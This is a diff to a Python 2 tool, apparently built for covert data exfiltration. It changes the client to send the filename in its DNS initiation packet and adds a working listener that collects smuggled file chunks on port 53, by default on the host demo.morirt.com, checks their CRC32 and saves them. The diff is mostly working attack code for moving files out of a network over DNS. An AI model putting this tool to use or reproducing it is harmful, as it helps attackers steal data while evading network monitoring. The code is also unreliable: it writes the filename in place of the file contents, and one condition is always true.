@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+import os
 import sys
 import zlib
 import time
@@ -15,6 +16,7 @@ DNS requests built with this: http://www.ccs.neu.edu/home/amislove/teaching/cs47
 
 # Constants
 READ_BINARY = "rb"
+WRITE_BINARY = "wb"
 MAX_PAYLOAD_SIZE = "76"
 INITIATION_STRING = "INIT_445"
 DELIMITER = "::"
@@ -81,7 +83,8 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 
 	# Initiation packet:
 	dns_request = build_dns(host)                                               # Build the DNS Query
-	dns_request += INITIATION_STRING + DELIMITER + checksum + NULL              # Extra data goes here
+	head, tail = os.path.split(path_to_file)                                       # Get filename
+	dns_request += INITIATION_STRING + tail + DELIMITER + checksum + NULL              # Extra data goes here
 
 	addr = (host, port)             # build address to send to
 	s.sendto(dns_request, addr)
@@ -102,38 +105,79 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 
 
 def dns_server(host="demo.morirt.com", port=53, play_dead=True):
+	"""
+	This will listen on the 53 port without killing a DNS server if there.
+	It will save incoming files from exfiltrator.
+	:param host: host to listen on.
+	:param port: 53 by default
+	:param play_dead: Should i pretend to be a DNS server or just be quiet?
+	:return:
+	"""
 
+	# Try opening socket and listen
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	except socket.error, msg :
 		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
 		raise
 
+	# Try binding to the socket
 	try:
 		s.bind((host, port))
-	except socket.error , msg:
+	except socket.error, msg:
 		sys.stderr.write('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
 		raise
 
 	# Will keep connection alive as needed
 	while 1:
-		# Todo: Here be done data analysis of incoming traffic. Need to finish server
-		pass
+		# Todo: DNS server is just a listener. We should allow the option of backwards communication.
 		# receive data from client (data, addr)
-		# d = s.recvfrom(1024)
-		# data = d[0]
-		# addr = d[1]
-		#
-		# if not data:
-		# 	# No damn data
-		# 	pass
-		#
-		# print data
-		#
-		# reply = 'OK...' + data
-		#
-		# s.sendto(reply, addr)
-		# print 'Message[' + addr[0] + ':' + str(addr[1]) + '] - ' + data.strip()
+		d = s.recvfrom(1024)
+		data = d[0]
+		addr = d[1]
+
+		if data.find(INITIATION_STRING) != -1:
+			# Found initiation packet:
+			offset_delimiter = data.find(DELIMITER) + len(DELIMITER)
+			offset_null = data.find(NULL)
+
+			filename = data[data.find(INITIATION_STRING) + len(INITIATION_STRING):data.find(DELIMITER)]
+			crc32 = data[offset_delimiter:offset_null]
+
+			sys.stdout.write("Initiation file transfer from " + str(addr) + " with file: " + str(filename))
+			actual_file = ""
+			chunks_count = 0
+
+		elif data.find(DELIMITER) != -1 and data.find(INITIATION_STRING) == -1:
+			# Found data packet:
+			end_of_header = data.find("\x00\x00\x01\x00\x01")
+			actual_file += data[end_of_header:]
+			chunks_count += 1
+
+		elif data.find(DATA_TERMINATOR+NULL+DATA_TERMINATOR):
+			# Found termination packet:
+
+			# Will now compate CRC32s:
+			if crc32 == str(zlib.crc32(actual_file)):
+				sys.stdout.write("CRC32 match! Now saving file")
+				fh = open(str(crc32) + filename, WRITE_BINARY)
+				fh.write(filename)
+				fh.close()
+				replay = "Got it. Thanks :)"
+				s.sendto(replay, addr)
+
+			else:
+				sys.stderr.write("CRC32 not match. Not saving file.")
+				replay = "You fucked up!"
+				s.sendto(replay, addr)
+
+			filename = ""
+			crc32 = ""
+			i = 0
+			addr = ""
+
+		else:
+			sys.stdout.write("Regular packet. Not listing it.")
 
 	s.close()
 	return 0
